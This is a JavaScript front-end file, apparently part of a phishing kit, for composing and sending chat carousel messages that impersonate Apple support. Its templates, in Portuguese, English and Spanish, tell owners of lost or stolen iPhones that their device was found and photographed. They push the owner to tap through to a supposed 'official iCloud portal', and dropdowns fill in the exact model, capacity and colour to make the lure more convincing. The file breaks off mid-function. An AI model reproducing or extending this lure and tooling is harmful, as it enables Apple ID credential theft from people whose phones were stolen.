// Configuração de API dinâmica: carrega de api_config.json se existir.
let proxyBaseUrl = window.location.origin; // Padrão: mesma origem do proxy
let endpointPaths = {
    sendCarousel: "/send-carousel-message",
    sendText: "/send-simple-text",
    configureWebhook: "/configure-webhook"
};
let proxyCarouselUrl = `${proxyBaseUrl}${endpointPaths.sendCarousel}`; // Endpoint padrão

async function initApiConfig() {
    try {
        const res = await fetch('/config/api_config.json', { cache: 'no-store' });
        if (res.ok) {
            const cfg = await res.json();
            if (cfg && typeof cfg === 'object') {
                // Base URL: se preenchido, usa; caso contrário mantém a origem atual
                if (typeof cfg.proxyBaseUrl === 'string') {
                    const trimmed = cfg.proxyBaseUrl.trim();
                    if (trimmed) {
                        // remove barra final para evitar //
                        proxyBaseUrl = trimmed.replace(/\/$/, '');
                    }
                }
                // Endpoints: permite personalizar caminhos
                if (cfg.endpoints && typeof cfg.endpoints === 'object') {
                    endpointPaths = {
                        sendCarousel: cfg.endpoints.sendCarousel || endpointPaths.sendCarousel,
                        sendText: cfg.endpoints.sendText || endpointPaths.sendText,
                        configureWebhook: cfg.endpoints.configureWebhook || endpointPaths.configureWebhook
                    };
                }
                // Recalcula URLs derivadas
                proxyCarouselUrl = `${proxyBaseUrl}${endpointPaths.sendCarousel}`;
                // Opcional: expõe para outros scripts
                window.APP_API = {
                    proxyBaseUrl,
                    endpoints: { ...endpointPaths },
                    urls: {
                        sendCarousel: proxyCarouselUrl,
                        sendText: `${proxyBaseUrl}${endpointPaths.sendText}`,
                        configureWebhook: `${proxyBaseUrl}${endpointPaths.configureWebhook}`
                    }
                };
                console.log('[API Config] Carregada:', window.APP_API);
            }
        } else {
            console.warn('[API Config] api_config.json não encontrado, usando padrão. Status:', res.status);
        }
    } catch (err) {
        console.warn('[API Config] Falha ao carregar api_config.json, usando padrão.', err);
    }
}

// Inicializa configuração assim que possível
initApiConfig();

const countriesDDI = [
    { name: "Afeganistão", code: "93" }, { name: "Argélia", code: "213" },
    { name: "Angola", code: "244" }, { name: "Argentina", code: "54" },
    { name: "Armênia", code: "374" }, { name: "Austrália", code: "61" },
    { name: "Áustria", code: "43" }, { name: "Bangladesh", code: "880" },
    { name: "Bélgica", code: "32" }, { name: "Bolívia", code: "591" },
    { name: "Brasil", code: "55" }, { name: "Canadá", code: "1" },
    { name: "Chile", code: "56" }, { name: "China", code: "86" },
    { name: "Colômbia", code: "57" }, { name: "Coreia do Sul", code: "82" },
    { name: "Coreia do Norte", code: "850" }, { name: "Costa Rica", code: "506" },
    { name: "Cuba", code: "53" }, { name: "Dinamarca", code: "45" },
    { name: "Ecuador", code: "593" }, { name: "Egito", code: "20" },
    { name: "El Salvador", code: "503" }, { name: "Espanha", code: "34" },
    { name: "Estados Unidos", code: "1" }, { name: "Estônia", code: "372" },
    { name: "Filipinas", code: "63" }, { name: "Finlândia", code: "358" },
    { name: "França", code: "33" }, { name: "", code: "49" },
    { name: "Grécia", code: "30" }, { name: "Guatemala", code: "502" },
    { name: "Haiti", code: "509" }, { name: "Holanda (Países Baixos)", code: "31" },
    { name: "Honduras", code: "504" }, { name: "Hungria", code: "36" },
    { name: "Índia", code: "91" }, { name: "Indonésia", code: "62" },
    { name: "Irã", code: "98" }, { name: "Iraque", code: "964" },
    { name: "Irlanda", code: "353" }, { name: "Israel", code: "972" },
    { name: "Itália", code: "39" }, { name: "Japão", code: "81" },
    { name: "Jordânia", code: "962" }, { name: "Quênia", "code": "254" },
    { name: "Kuwait", code: "965" }, { name: "Letônia", code: "371" },
    { name: "Líbano", code: "961" }, { name: "Líbia", code: "218" },
    { name: "Lituânia", code: "370" }, { name: "Luxemburgo", code: "352" },
    { name: "Macau", code: "853" }, { name: "Macedônia do Norte", code: "389" },
    { name: "Malásia", code: "60" }, { name: "Mali", code: "223" },
    { name: "Malta", code: "356" }, { name: "México", code: "52" },
    { name: "Moçambique", code: "258" }, { name: "Marrocos", code: "212" },
    { name: "Namíbia", code: "264" }, { name: "Nepal", code: "977" },
    { name: "Nicarágua", code: "505" }, { name: "Nigéria", code: "234" },
    { name: "Noruega", code: "47" }, { name: "Omã", code: "968" },
    { name: "Paquistão", code: "92" }, { name: "Panamá", code: "507" },
    { name: "Paraguai", code: "595" }, { name: "Peru", code: "51" },
    { name: "Polônia", code: "48" }, { name: "Portugal", code: "351" },
    { name: "Qatar", code: "974" }, { name: "Romênia", code: "40" },
    { name: "Rússia", code: "7" }, { name: "Arábia Saudita", code: "966" },
    { name: "Senegal", code: "221" }, { name: "Sérvia", code: "381" },
    { name: "Singapura", code: "65" }, { name: "Eslováquia", code: "421" },
    { name: "Eslovênia", code: "386" }, { name: "África do Sul", code: "27" },
    { name: "Somália", code: "252" }, { name: "Sudão", code: "249" },
    { name: "Suécia", code: "46" }, { name: "Suíça", code: "41" },
    { name: "Síria", code: "963" }, { name: "Taiwan", code: "886" },
    { name: "Tanzânia", code: "255" }, { name: "Tailândia", code: "66" },
    { name: "Tunísia", code: "216" }, { name: "Turquia", code: "90" },
    { name: "Ucrânia", code: "380" }, { name: "Emirados Árabes Unidos", code: "971" },
    { name: "Reino Unido", code: "44" }, { name: "Uruguai", code: "598" },
    { name: "Uzbequistão", code: "998" }, { name: "Venezuela", code: "58" },
    { name: "Vietnã", code: "84" }, { name: "Iêmen", code: "967" },
    { name: "Zâmbia", code: "260" }, { name: "Zimbábue", code: "263" }
];
countriesDDI.forEach(function (c) {
    const raw = String(c.name || '').trim();
    let id = String(c.id || '').trim();
    if (!id) { id = raw.replace(/\s+/g, "_").toUpperCase(); }
    if (raw === "Estados Unidos") id = "US";
    if (raw === "Canadá") id = "CA";
    if (raw === "Brasil") id = "BR";
    c.id = id;
});

// Normaliza URLs sem protocolo, prefixando https:// quando necessário
function normalizeUrlMaybe(u) {
    if (!u) return u;
    const s = String(u).trim();
    if (/^https?:\/\//i.test(s)) return s;
    return 'https://' + s.replace(/^\/+/, '');
}

const coresIphoneGlobal = [
    "Silver", "Space Gray", "Gold", "Rose Gold", "(PRODUCT)RED",
    "White", "Black", "Blue", "Green", "Yellow", "Coral", "Purple",
    "Starlight", "Midnight", "Pacific Blue", "Graphite", "Sierra Blue",
    "Alpine Green", "Deep Purple", "Space Black", "Natural Titanium",
    "Blue Titanium", "White Titanium", "Black Titanium", "Desert Titanium",
    "Jet Black", "Midnight Green", "Pink", "Rose Titanium", "Midnight Titanium"
];

const capacidadesIphoneGlobal = [
    "16 GB", "32 GB", "64 GB", "128 GB", "256 GB", "512 GB", "1 TB", "2 TB"
];

// --- DEFINIÇÕES DE MENSAGENS COM ASTERISCOS CORRIGIDOS ---
const generalCarouselMessageTemplate = "*🍏 Assistente Virtual Apple – Suporte ao Cliente*";
// Versões do título da Mensagem Geral por idioma
const generalCarouselMessageTemplateLang = {
    pt: "*🍏 Assistente Virtual Apple – Suporte ao Cliente*",
    en: "*🍏 Apple Virtual Assistant – Customer Support*",
    es: "*🍏 Asistente Virtual de Apple – Atención al Cliente*"
};
const defaultCardTemplateText = `*🔔 ALERTA DE LOCALIZAÇÃO: Dispositivo Encontrado*

Detectamos a localização do seu *[MODELO_COMPLETO]*, marcado como Perdido/Roubado.
➡️ Por segurança, uma *imagem* foi capturada no momento da localização. 

Para visualizar os dados e *iniciar* o processo de recuperação de forma segura, acesse sua conta Apple:

👇 Toque no *botão* abaixo para continuar com a verificação:
(Você será redirecionado ao portal oficial iCloud)
>  Apple ID | Support |  Privacy Policy
> Copyright © 2025 Apple Inc`;

// Versões do texto padrão por idioma
const defaultCardTemplateTextLang = {
    pt: defaultCardTemplateText,
    en: `*🔔 LOCATION ALERT: Device Found*

We detected the location of your *[MODELO_COMPLETO]*, marked as Lost/Stolen.
➡️ For safety, an *image* was captured at the time of location. 

To view the data and *start* the recovery process securely, access your Apple account:

👇 Tap the *button* below to continue verification:
(You will be redirected to the official iCloud portal)
>  Apple ID | Support |  Privacy Policy
> Copyright © 2025 Apple Inc`,
    es: `*🔔 ALERTA DE UBICACIÓN: Dispositivo Encontrado*

Detectamos la ubicación de su *[MODELO_COMPLETO]*, marcado como Perdido/Robado.
➡️ Por seguridad, se capturó una *imagen* en el momento de la ubicación. 

Para ver los datos e *iniciar* el proceso de recuperación de forma segura, acceda a su cuenta de Apple:

👇 Toque el *botón* abajo para continuar con la verificación:
(Será redirigido al portal oficial de iCloud)
>  Apple ID | Support |  Privacy Policy
> Copyright © 2025 Apple Inc`
};

// Idioma corrente do texto dos cartões (Português automático por padrão)
window.cardTextLang = 'pt';
// Flag global: usuário editou manualmente a Mensagem Geral
window.mensagemGeralEdited = false;

function getDefaultCardTextByLang() {
    return defaultCardTemplateTextLang[window.cardTextLang] || defaultCardTemplateTextLang.pt;
}

const carouselTemplates = [
    {
        id: "iphone_6_series_template",
        name: "Modelo: iPhone 6 / 6S Series",
        generalMessage: generalCarouselMessageTemplate,
        delay: 5,
        subModels: [
            { name: "iPhone 6", capacidades: ["16 GB", "64 GB", "128 GB"], cores: ["Silver", "Space Gray", "Gold"] },
            { name: "iPhone 6 Plus", capacidades: ["16 GB", "64 GB", "128 GB"], cores: ["Silver", "Space Gray", "Gold"] },
            { name: "iPhone 6S", capacidades: ["16 GB", "32 GB", "64 GB", "128 GB"], cores: ["Silver", "Space Gray", "Gold", "Rose Gold"] },
            { name: "iPhone 6S Plus", capacidades: ["16 GB", "32 GB", "64 GB", "128 GB"], cores: ["Silver", "Space Gray", "Gold", "Rose Gold"] }
        ],
        cards: [{ text: defaultCardTemplateText, image: "https://i.pcmag.com/imagery/articles/01a05tCWORxCw1D6nH0ChDZ-68.fit_lim.v1705428880.jpg" }]
    },
    {
        id: "iphone_se_1gen_template",
        name: "Modelo: iPhone SE (1ª geração - 2016)",
        generalMessage: generalCarouselMessageTemplate,
        delay: 5,
        subModels: [
            { name: "iPhone SE (1ª Geração)", capacidades: ["16 GB", "32 GB", "64 GB", "128 GB"], cores: ["Silver", "Space Gray", "Gold", "Rose Gold"] }
        ],
        cards: [{ text: defaultCardTemplateText, image: "https://i.pcmag.com/imagery/articles/01a05tCWORxCw1D6nH0ChDZ-68.fit_lim.v1705428880.jpg" }]
    },
    {
        id: "iphone_7_series_template",
        name: "Modelo: iPhone 7 / 7 Plus",
        generalMessage: generalCarouselMessageTemplate,
        delay: 5,
        subModels: [
            { name: "iPhone 7", capacidades: ["32 GB", "128 GB", "256 GB"], cores: ["Jet Black", "Black", "Silver", "Gold", "Rose Gold", "(PRODUCT)RED"] },
            { name: "iPhone 7 Plus", capacidades: ["32 GB", "128 GB", "256 GB"], cores: ["Jet Black", "Black", "Silver", "Gold", "Rose Gold", "(PRODUCT)RED"] }
        ],
        cards: [{ text: defaultCardTemplateText, image: "https://i.pcmag.com/imagery/articles/01a05tCWORxCw1D6nH0ChDZ-68.fit_lim.v1705428880.jpg" }]
    },
    {
        id: "iphone_8_x_series_template",
        name: "Modelo: iPhone 8 / 8 Plus / X",
        generalMessage: generalCarouselMessageTemplate,
        delay: 5,
        subModels: [
            { name: "iPhone 8", capacidades: ["64 GB", "128 GB", "256 GB"], cores: ["Silver", "Space Gray", "Gold", "(PRODUCT)RED"] },
            { name: "iPhone 8 Plus", capacidades: ["64 GB", "128 GB", "256 GB"], cores: ["Silver", "Space Gray", "Gold", "(PRODUCT)RED"] },
            { name: "iPhone X", capacidades: ["64 GB", "256 GB"], cores: ["Silver", "Space Gray"] }
        ],
        cards: [{ text: defaultCardTemplateText, image: "https://i.pcmag.com/imagery/articles/01a05tCWORxCw1D6nH0ChDZ-68.fit_lim.v1705428880.jpg" }]
    },
    {
        id: "iphone_xr_xs_xs_max_series_template",
        name: "Modelo: iPhone XR / XS / XS Max",
        generalMessage: generalCarouselMessageTemplate,
        delay: 5,
        subModels: [
            { name: "iPhone XR", capacidades: ["64 GB", "128 GB", "256 GB"], cores: ["White", "Black", "Blue", "Yellow", "Coral", "(PRODUCT)RED"] },
            { name: "iPhone XS", capacidades: ["64 GB", "256 GB", "512 GB"], cores: ["Silver", "Space Gray", "Gold"] },
            { name: "iPhone XS Max", capacidades: ["64 GB", "256 GB", "512 GB"], cores: ["Silver", "Space Gray", "Gold"] }
        ],
        cards: [{ text: defaultCardTemplateText, image: "https://i.pcmag.com/imagery/articles/01a05tCWORxCw1D6nH0ChDZ-68.fit_lim.v1705428880.jpg" }]
    },
    {
        id: "iphone_11_series_template",
        name: "Modelo: iPhone 11 / 11 Pro / 11 Pro Max",
        generalMessage: generalCarouselMessageTemplate,
        delay: 5,
        subModels: [
            { name: "iPhone 11", capacidades: ["64 GB", "128 GB", "256 GB"], cores: ["Purple", "Yellow", "Green", "Black", "White", "(PRODUCT)RED"] },
            { name: "iPhone 11 Pro", capacidades: ["64 GB", "256 GB", "512 GB"], cores: ["Space Gray", "Silver", "Gold", "Midnight Green"] },
            { name: "iPhone 11 Pro Max", capacidades: ["64 GB", "256 GB", "512 GB"], cores: ["Space Gray", "Silver", "Gold", "Midnight Green"] }
        ],
        cards: [{ text: defaultCardTemplateText, image: "https://i.pcmag.com/imagery/articles/01a05tCWORxCw1D6nH0ChDZ-68.fit_lim.v1705428880.jpg" }]
    },
    {
        id: "iphone_se_2gen_template",
        name: "Modelo: iPhone SE (2ª geração - 2020)",
        generalMessage: generalCarouselMessageTemplate,
        delay: 5,
        subModels: [
            { name: "iPhone SE (2ª Geração)", capacidades: ["64 GB", "128 GB", "256 GB"], cores: ["Black", "White", "(PRODUCT)RED"] }
        ],
        cards: [{ text: defaultCardTemplateText, image: "https://i.pcmag.com/imagery/articles/01a05tCWORxCw1D6nH0ChDZ-68.fit_lim.v1705428880.jpg" }]
    },
    {
        id: "iphone_12_series_template",
        name: "Modelo: iPhone 12 / 12 mini / 12 Pro / 12 Pro Max",
        generalMessage: generalCarouselMessageTemplate,
        delay: 5,
        subModels: [
            { name: "iPhone 12", capacidades: ["64 GB", "128 GB", "256 GB"], cores: ["White", "Black", "Blue", "Green", "Purple", "(PRODUCT)RED"] },
            { name: "iPhone 12 mini", capacidades: ["64 GB", "128 GB", "256 GB"], cores: ["White", "Black", "Blue", "Green", "Purple", "(PRODUCT)RED"] },
            { name: "iPhone 12 Pro", capacidades: ["128 GB", "256 GB", "512 GB"], cores: ["Silver", "Graphite", "Gold", "Pacific Blue"] },
            { name: "iPhone 12 Pro Max", capacidades: ["128 GB", "256 GB", "512 GB"], cores: ["Silver", "Graphite", "Gold", "Pacific Blue"] }
        ],
        cards: [{ text: defaultCardTemplateText, image: "https://i.pcmag.com/imagery/articles/01a05tCWORxCw1D6nH0ChDZ-68.fit_lim.v1705428880.jpg" }]
    },
    {
        id: "iphone_13_series_template",
        name: "Modelo: iPhone 13 / 13 mini / 13 Pro / 13 Pro Max",
        generalMessage: generalCarouselMessageTemplate,
        delay: 5,
        subModels: [
            { name: "iPhone 13", capacidades: ["128 GB", "256 GB", "512 GB"], cores: ["Starlight", "Midnight", "Blue", "Pink", "Green", "(PRODUCT)RED"] },
            { name: "iPhone 13 mini", capacidades: ["128 GB", "256 GB", "512 GB"], cores: ["Starlight", "Midnight", "Blue", "Pink", "Green", "(PRODUCT)RED"] },
            { name: "iPhone 13 Pro", capacidades: ["128 GB", "256 GB", "512 GB", "1 TB"], cores: ["Silver", "Graphite", "Gold", "Sierra Blue", "Alpine Green"] },
            { name: "iPhone 13 Pro Max", capacidades: ["128 GB", "256 GB", "512 GB", "1 TB"], cores: ["Silver", "Graphite", "Gold", "Sierra Blue", "Alpine Green"] }
        ],
        cards: [{ text: defaultCardTemplateText, image: "https://i.pcmag.com/imagery/articles/01a05tCWORxCw1D6nH0ChDZ-68.fit_lim.v1705428880.jpg" }]
    },
    {
        id: "iphone_se_3gen_template",
        name: "Modelo: iPhone SE (3ª geração - 2022)",
        generalMessage: generalCarouselMessageTemplate,
        delay: 5,
        subModels: [
            { name: "iPhone SE (3ª Geração)", capacidades: ["64 GB", "128 GB", "256 GB"], cores: ["Midnight", "Starlight", "(PRODUCT)RED"] }
        ],
        cards: [{ text: defaultCardTemplateText, image: "https://i.pcmag.com/imagery/articles/01a05tCWORxCw1D6nH0ChDZ-68.fit_lim.v1705428880.jpg" }]
    },
    {
        id: "iphone_14_series_template",
        name: "Modelo: iPhone 14 / 14 Plus / 14 Pro / 14 Pro Max",
        generalMessage: generalCarouselMessageTemplate,
        delay: 5,
        subModels: [
            { name: "iPhone 14", capacidades: ["128 GB", "256 GB", "512 GB"], cores: ["Midnight", "Starlight", "Blue", "Purple", "Yellow", "(PRODUCT)RED"] },
            { name: "iPhone 14 Plus", capacidades: ["128 GB", "256 GB", "512 GB"], cores: ["Midnight", "Starlight", "Blue", "Purple", "Yellow", "(PRODUCT)RED"] },
            { name: "iPhone 14 Pro", capacidades: ["128 GB", "256 GB", "512 GB", "1 TB"], cores: ["Space Black", "Silver", "Gold", "Deep Purple"] },
            { name: "iPhone 14 Pro Max", capacidades: ["128 GB", "256 GB", "512 GB", "1 TB"], cores: ["Space Black", "Silver", "Gold", "Deep Purple"] }
        ],
        cards: [{ text: defaultCardTemplateText, image: "https://i.pcmag.com/imagery/articles/01a05tCWORxCw1D6nH0ChDZ-68.fit_lim.v1705428880.jpg" }]
    },
    {
        id: "iphone_15_series_template",
        name: "Modelo: iPhone 15 / 15 Plus / 15 Pro / 15 Pro Max",
        generalMessage: generalCarouselMessageTemplate,
        delay: 5,
        subModels: [
            { name: "iPhone 15", capacidades: ["128 GB", "256 GB", "512 GB"], cores: ["Black", "Blue", "Green", "Yellow", "Pink"] },
            { name: "iPhone 15 Plus", capacidades: ["128 GB", "256 GB", "512 GB"], cores: ["Black", "Blue", "Green", "Yellow", "Pink"] },
            { name: "iPhone 15 Pro", capacidades: ["128 GB", "256 GB", "512 GB", "1 TB"], cores: ["Black Titanium", "White Titanium", "Blue Titanium", "Natural Titanium"] },
            { name: "iPhone 15 Pro Max", capacidades: ["256 GB", "512 GB", "1 TB"], cores: ["Black Titanium", "White Titanium", "Blue Titanium", "Natural Titanium"] }
        ],
        cards: [{ text: defaultCardTemplateText, image: "https://i.pcmag.com/imagery/articles/01a05tCWORxCw1D6nH0ChDZ-68.fit_lim.v1705428880.jpg" }]
    },
    {
        id: "iphone_16_series_template",
        name: "Modelo: iPhone 16 / 16e / 16 Plus / 16 Pro / 16 Pro Max (linha atual 2024)",
        generalMessage: generalCarouselMessageTemplate,
        delay: 5,
        subModels: [
            { name: "iPhone 16", capacidades: ["128 GB", "256 GB", "512 GB"], cores: ["Black", "White", "Blue", "Yellow", "Pink", "Green"] },
            { name: "iPhone 16e", capacidades: ["128 GB", "256 GB", "512 GB"], cores: ["Black", "White"] },
            { name: "iPhone 16 Plus", capacidades: ["128 GB", "256 GB", "512 GB"], cores: ["Black", "White", "Blue", "Yellow", "Pink", "Green"] },
            { name: "iPhone 16 Pro", capacidades: ["256 GB", "512 GB", "1 TB", "2 TB"], cores: ["Space Black Titanium", "Silver Titanium", "Rose Titanium", "Natural Titanium", "Midnight Titanium"] },
            { name: "iPhone 16 Pro Max", capacidades: ["256 GB", "512 GB", "1 TB", "2 TB"], cores: ["Space Black Titanium", "Silver Titanium", "Rose Titanium", "Natural Titanium", "Midnight Titanium"] }
        ],
        cards: [{ text: defaultCardTemplateText, image: "https://i.pcmag.com/imagery/articles/01a05tCWORxCw1D6nH0ChDZ-68.fit_lim.v1705428880.jpg" }]
    },
    {
        id: "iphone_17_series_template",
        name: "Modelo: iPhone 17 / 17 Air / 17 Pro / 17 Pro Max (linha atual 2025)",
        generalMessage: generalCarouselMessageTemplate,
        delay: 5,
        subModels: [
            { name: "iPhone 17", capacidades: ["256 GB", "512 GB"], cores: ["Black", "White", "Green", "Sage", "Pumple", "Mist Blue", "Light Blue"] },
            { name: "iPhone 17 Air", capacidades: ["256 GB", "512 GB", "1TB"], cores: ["Sky Blue", "Light Golden", "Cloud White", "Space black"] },
            { name: "iPhone 17 Pro", capacidades: ["256 GB", "512 GB", "1 TB",], cores: ["Silver", "Intense Blue", "Cosmic Orange"] },
            { name: "iPhone 17 Pro Max", capacidades: ["256 GB", "512 GB", "1 TB", "2TB"], cores: ["Silver", "Intense Blue", "Cosmic Orange"] }
        ],
        cards: [{ text: defaultCardTemplateText, image: "https://i.pcmag.com/imagery/articles/01a05tCWORxCw1D6nH0ChDZ-68.fit_lim.v1705428880.jpg" }]
    }
];

let cardIndexCounter = 0;

// --- Funções Auxiliares ---

function populateSelect(selectElement, optionsArray, isCountryDDI = false) {
    if (isCountryDDI) {
        selectElement.innerHTML = '';
        const placeholder = document.createElement('option');
        placeholder.value = '';
        placeholder.textContent = '-- Selecione o País (DDI) --';
        placeholder.disabled = true;
        placeholder.selected = true;
        selectElement.appendChild(placeholder);
        (Array.isArray(optionsArray) ? optionsArray : []).forEach(optionData => {
            const option = document.createElement('option');
            option.value = String(optionData.id || '').toUpperCase();
            option.setAttribute('data-code', String(optionData.code || ''));
            option.textContent = `${optionData.name} (+${optionData.code})`;
            selectElement.appendChild(option);
        });
        return;
    }
    while (selectElement.options.length > 1) {
        selectElement.remove(1);
    }
    (Array.isArray(optionsArray) ? optionsArray : []).forEach(optionText => {
        const option = document.createElement('option');
        option.value = optionText;
        option.textContent = optionText;
        selectElement.appendChild(option);
    });
}

// Preenche o select de sub-modelos de iPhone
function populateiPhoneModelSelect(selectElement, modelsArray) {
    selectElement.innerHTML = '<option value="">Selecione o Modelo</option>'; // Limpa e adiciona o placeholder
    modelsArray.forEach(modelData => {
        const option = document.createElement("option");
        option.value = modelData.name; // O valor da opção é o nome do modelo
        option.textContent = modelData.name;
        selectElement.appendChild(option);
    });
    // Após alterar as opções, garantir que o dropdown customizado seja atualizado
    if (window.refreshEnhancedSelect) {
        window.refreshEnhancedSelect(selectElement);
    }
    // Se nenhum modelo estiver selecionado, pré-seleciona o primeiro e aciona change
    try {
        const hasValue = (selectElement.value && selectElement.value.trim() !== '');
        if (!hasValue && modelsArray && modelsArray.length > 0) {
            selectElement.value = modelsArray[0].name;
            selectElement.dispatchEvent(new Event('change'));
        }
    } catch (_) { }
    try {
        window.sendUiLog && window.sendUiLog('carousel.populateModelSelect', {
            selectId: selectElement.id || null,
            modelsCount: Array.isArray(modelsArray) ? modelsArray.length : 0,
            selected: selectElement.value || null
        });
    } catch (_) { }
}

/**
 * Atualiza os dropdowns de capacidade e cor com base no modelo de iPhone selecionado
 * e então atualiza o texto do cartão.
 * @param {number} cardId - O ID do cartão atual.
 */
function updateCapacityAndColorSelects(cardId) {
    const mainModelSelect = document.getElementById("carouselTemplate");
    const selectedTemplateId = mainModelSelect.value;
    const selectedTemplate = carouselTemplates.find(t => t.id === selectedTemplateId);

    const subModelSelect = document.getElementById(`card-model-${cardId}`);
    const selectedSubModelName = subModelSelect.value;

    const capacitySelect = document.getElementById(`card-capacity-${cardId}`);
    const colorSelect = document.getElementById(`card-color-${cardId}`);

    // Limpa os selects de capacidade e cor antes de preencher
    populateSelect(capacitySelect, []);
    populateSelect(colorSelect, []);

    if (selectedTemplate && selectedSubModelName) {
        // Encontra os dados do sub-modelo selecionado dentro do template
        const subModelData = selectedTemplate.subModels.find(sub => sub.name === selectedSubModelName);

        if (subModelData) {
            // Preenche capacidade e cor com base nos dados do sub-modelo
            populateSelect(capacitySelect, subModelData.capacidades);
            populateSelect(colorSelect, subModelData.cores);

            // Tenta pré-selecionar a primeira opção disponível para capacidade e cor
            // Se já houver um valor selecionado, mantém, senão seleciona o primeiro.
            // É importante fazer isso APÓS popular o select.
            if (capacitySelect.options.length > 1 && !capacitySelect.value) {
                capacitySelect.value = capacitySelect.options[1].value;
            }
            if (colorSelect.options.length > 1 && !colorSelect.value) {
                colorSelect.value = colorSelect.options[1].value;
            }
        }
    }
    // Atualiza dropdowns customizados se existirem
    if (window.refreshEnhancedSelect) {
        window.refreshEnhancedSelect(capacitySelect);
        window.refreshEnhancedSelect(colorSelect);
    }
    // Chame updateCardText aqui para garantir que o texto seja atualizado após preencher os selects
    updateCardText(cardId);
}


function updateCardText(cardId) {
    const modelSelect = document.getElementById(`card-model-${cardId}`);
    const capacidadeSelect = document.getElementById(`card-capacity-${cardId}`);
    const colorSelect = document.getElementById(`card-color-${cardId}`);
    const textarea = document.getElementById(`card-text-${cardId}`);

    // O ponto de partida é SEMPRE o texto original do template armazenado no data-template-text
    // Isso garante que o placeholder original esteja disponível
    let baseText = textarea.getAttribute('data-template-text') || defaultCardTemplateText;

    const model = modelSelect ? modelSelect.value.trim() : '';
    const capacidade = capacidadeSelect ? capacidadeSelect.value.trim() : '';
    const cor = colorSelect ? colorSelect.value.trim() : '';

    let fullModelStringParts = [];
    if (model) {
        fullModelStringParts.push(model);
    }
    // GARANTIA: Inclui a capacidade se ela estiver selecionada
    if (capacidade) {
        fullModelStringParts.push(capacidade);
    }
    // GARANTIA: Inclui a cor se ela estiver selecionada
    if (cor) {
        fullModelStringParts.push(cor);
    }

    let fullModelContent = fullModelStringParts.join(' ').trim();

    // O texto que será usado para substituir o placeholder. Se vazio, o placeholder será removido.
    const replacementModelText = fullModelContent ? `*${fullModelContent}*` : '';

    // Substitui qualquer ocorrência do placeholder [MODELO_COMPLETO] (com ou sem asteriscos) de forma agnóstica de idioma
    const placeholderRegex = /\*?\[MODELO_COMPLETO\]\*?/g;
    let newText = baseText.replace(placeholderRegex, replacementModelText);

    // Normaliza múltiplos espaços para um único espaço no texto final.
    newText = newText.replace(/ {2,}/g, ' ');

    textarea.value = newText.trim();
}


// --- Componente Select Customizado (dropdown com cor do painel) ---
window.enhanceSelect = function (selectEl) {
    if (!selectEl || selectEl.dataset.enhanced === '1') return;
    selectEl.dataset.enhanced = '1';

    const wrapper = document.createElement('div');
    wrapper.className = 'custom-select';

    const trigger = document.createElement('button');
    trigger.type = 'button';
    trigger.className = 'custom-trigger';
    const arrow = document.createElement('span');
    arrow.textContent = '▾';

    const updateTriggerLabel = () => {
        const opt = selectEl.options[selectEl.selectedIndex];
        trigger.textContent = opt ? opt.text : 'Selecionar';
        trigger.appendChild(arrow);
    };

    const optionsList = document.createElement('div');
    optionsList.className = 'custom-options';
    // Portal: render options list in document.body to avoid clipping by tabs/panels
    optionsList.style.position = 'fixed';
    optionsList.style.zIndex = '10000';
    optionsList.style.display = 'none';
    document.body.appendChild(optionsList);
    // Keep a reference for refresh
    selectEl._optionsListRef = optionsList;

    const buildOptions = () => {
        optionsList.innerHTML = '';
        Array.from(selectEl.options).forEach((opt, idx) => {
            const item = document.createElement('div');
            item.className = 'option-item';
            item.setAttribute('role', 'option');
            item.setAttribute('data-value', opt.value);
            item.setAttribute('aria-selected', selectEl.selectedIndex === idx ? 'true' : 'false');
            item.textContent = opt.text;
            if (opt.disabled) {
                item.style.opacity = '0.6';
                item.style.cursor = 'not-allowed';
            }
            item.addEventListener('click', () => {
                if (opt.disabled) return;
                selectEl.value = opt.value;
                selectEl.dispatchEvent(new Event('change'));
                updateTriggerLabel();
                optionsList.style.display = 'none';
                wrapper.setAttribute('aria-expanded', 'false');
            });
            optionsList.appendChild(item);
        });
    };

    const closeOptions = () => {
        optionsList.style.display = 'none';
        wrapper.setAttribute('aria-expanded', 'false');
    };
    const openOptions = () => {
        // Position below trigger and match its width
        const rect = trigger.getBoundingClientRect();
        optionsList.style.minWidth = rect.width + 'px';
        optionsList.style.left = rect.left + 'px';
        optionsList.style.top = (rect.bottom + 4) + 'px';
        optionsList.style.display = 'block';
        wrapper.setAttribute('aria-expanded', 'true');
        try {
            window.sendUiLog && window.sendUiLog('carousel.openDropdown', {
                selectId: selectEl.id || null,
                optionsCount: selectEl.options ? selectEl.options.length : 0,
                rect: { left: rect.left, top: rect.top, width: rect.width, bottom: rect.bottom }
            });
        } catch (_) { }
    };

    trigger.addEventListener('click', (e) => {
        e.preventDefault();
        const visible = optionsList.style.display === 'block';
        if (visible) closeOptions(); else openOptions();
    });

    document.addEventListener('click', (evt) => {
        const clickedInsideWrapper = wrapper.contains(evt.target);
        const clickedInsideOptions = optionsList.contains(evt.target);
        if (!clickedInsideWrapper && !clickedInsideOptions) closeOptions();
    });
    // Close on scroll/resize to prevent misalignment
    window.addEventListener('scroll', closeOptions, { passive: true });
    window.addEventListener('resize', closeOptions);

    selectEl.classList.add('hidden-select');
    const parent = selectEl.parentNode;
    parent.insertBefore(wrapper, selectEl);
    wrapper.appendChild(selectEl);
    wrapper.appendChild(trigger);
    // optionsList is portaled to body; do not append inside wrapper

    buildOptions();
    updateTriggerLabel();
};

window.refreshEnhancedSelect = function (selectEl) {
    if (!selectEl) return;
    const wrapper = selectEl.closest('.custom-select');
    if (!wrapper) return;
    const trigger = wrapper.querySelector('.custom-trigger');
    const optionsList = selectEl._optionsListRef || document.createElement('div');
    if (!trigger || !optionsList) return;
    optionsList.innerHTML = '';
    Array.from(selectEl.options).forEach((opt, idx) => {
        const item = document.createElement('div');
        item.className = 'option-item';
        item.setAttribute('role', 'option');
        item.setAttribute('data-value', opt.value);
        item.setAttribute('aria-selected', selectEl.selectedIndex === idx ? 'true' : 'false');
        item.textContent = opt.text;
        if (opt.disabled) {
            item.style.opacity = '0.6';
            item.style.cursor = 'not-allowed';
        }
        item.addEventListener('click', () => {
            if (opt.disabled) return;
            selectEl.value = opt.value;
            selectEl.dispatchEvent(new Event('change'));
            const arrow = document.createElement('span');
            arrow.textContent = '▾';
            trigger.textContent = opt.text;
            trigger.appendChild(arrow);
            optionsList.style.display = 'none';
            wrapper.setAttribute('aria-expanded', 'false');
        });
        optionsList.appendChild(item);
    });
    const arrow = document.createElement('span');
    arrow.textContent = '▾';
    const opt = selectEl.options[selectEl.selectedIndex];
    trigger.textContent = opt ? opt.text : 'Selecionar';
    trigger.appendChild(arrow);
};

// Envio de logs de UI para diagnóstico
window.sendUiLog = async function (event, details) {
    try {
